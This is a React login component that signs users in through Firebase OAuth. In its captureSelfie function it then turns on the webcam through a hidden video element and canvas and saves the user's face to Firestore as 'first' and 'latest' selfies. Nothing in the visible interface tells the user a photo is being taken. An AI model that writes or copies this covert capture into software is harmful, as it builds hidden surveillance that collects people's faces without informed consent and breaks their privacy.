// src/react/default/login.tsx
import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { 
  signInWithPopup, 
  GoogleAuthProvider, 
  GithubAuthProvider, 
  OAuthProvider 
} from "firebase/auth";
import { auth, db } from "@config/firebase";
import { motion } from "framer-motion";
import { GithubIcon, GoogleIcon, YahooIcon } from "@/react/control/icon";
import { cardVariants, textVariants, iconVariants } from "@/react/animation/login";
import { useDispatch } from "react-redux";
import { setToken } from "@redux/authslice";
import { saveUserOnLogin } from "@config/userstorage";
import { doc, setDoc, getDoc } from "firebase/firestore";
import Loading from "@control/loading";

const Login: React.FC = () => {
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = "auto";
      if (videoRef.current?.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream?.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const captureSelfie = async (uid: string): Promise<string | null> => {
    try {
      console.log("Starting selfie capture...");
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = canvasRef.current;
        const video = videoRef.current;
        if (canvas && video && video.videoWidth > 0 && video.videoHeight > 0) {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx?.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', 0.7);
          
          // Cek apakah sudah ada firstSelfie
          const firstSelfieRef = doc(db, "users", uid, "selfie", "first");
          const firstSelfieSnap = await getDoc(firstSelfieRef);
          
          // Jika belum ada firstSelfie, simpan sebagai first
          if (!firstSelfieSnap.exists()) {
            await setDoc(firstSelfieRef, {
              image: imageData,
              timestamp: new Date(),
            });
            console.log("First selfie saved");
          }
          
          // Selalu update latest selfie
          const latestSelfieRef = doc(db, "users", uid, "selfie", "latest");
          await setDoc(latestSelfieRef, {
            image: imageData,
            timestamp: new Date(),
          }, { merge: true });
          
          console.log("Latest selfie saved");
          
          stream.getTracks().forEach(track => track.stop());
          return imageData;
        }
      }
      return null;
    } catch (err) {
      console.error("Selfie capture failed:", err);
      return null;
    }
  };

  const handleLogin = async (providerName: string) => {
    let provider;
    if (providerName === "google") provider = new GoogleAuthProvider();
    else if (providerName === "github") provider = new GithubAuthProvider();
    else if (providerName === "yahoo") provider = new OAuthProvider('yahoo.com');
    else return;

    try {
      setIsLoading(true);
      const result = await signInWithPopup(auth, provider);
      const user = result.user;
      
      await saveUserOnLogin(user, providerName);
      await captureSelfie(user.uid);
      
      const token = await user.getIdToken();
      dispatch(setToken(token));
      
      navigate("/dashboard");
    } catch (error: any) {
      console.error("Auth Error:", error);
      if (error.code !== "auth/cancelled-popup-request" && error.code !== "auth/popup-closed-by-user") {
        alert("Login failed. Please try again.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <video ref={videoRef} style={{ display: 'none' }} autoPlay playsInline muted />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
      
      {isLoading ? (
        <Loading />
      ) : (
        <div className="login-container">
          <motion.div 
            className="login-card"
            variants={cardVariants}
            initial="initial"
            animate="animate"
          >
            <motion.h1 
              className="login-title"
              variants={textVariants(0.2)}
              initial="initial"
              animate="animate"
            >
              Sign In
            </motion.h1>

            <motion.p 
              className="login-text"
              variants={textVariants(0.3)}
              initial="initial"
              animate="animate"
            >
              Choose a provider to continue
            </motion.p>

            <div className="login-icon-wrapper">
              <motion.div 
                className="login-icon-box"
                variants={iconVariants(0.4)}
                initial="initial"
                animate="animate"
                whileHover="hover"
                whileTap="tap"
                onClick={() => handleLogin("yahoo")} 
              >
                <YahooIcon />
              </motion.div>

              <motion.div 
                className="login-icon-box"
                variants={iconVariants(0.8)}
                initial="initial"
                animate="animate"
                whileHover="hover"
                whileTap="tap"
                onClick={() => handleLogin("github")} 
              >
                <GithubIcon />
              </motion.div>

              <motion.div 
                className="login-icon-box"
                variants={iconVariants(0.6)}
                initial="initial"
                animate="animate"
                whileHover="hover"
                whileTap="tap"
                onClick={() => handleLogin("google")} 
              >
                <GoogleIcon />
              </motion.div>
            </div>
          </motion.div>
        </div>
      )}
    </>
  );
};

export default Login;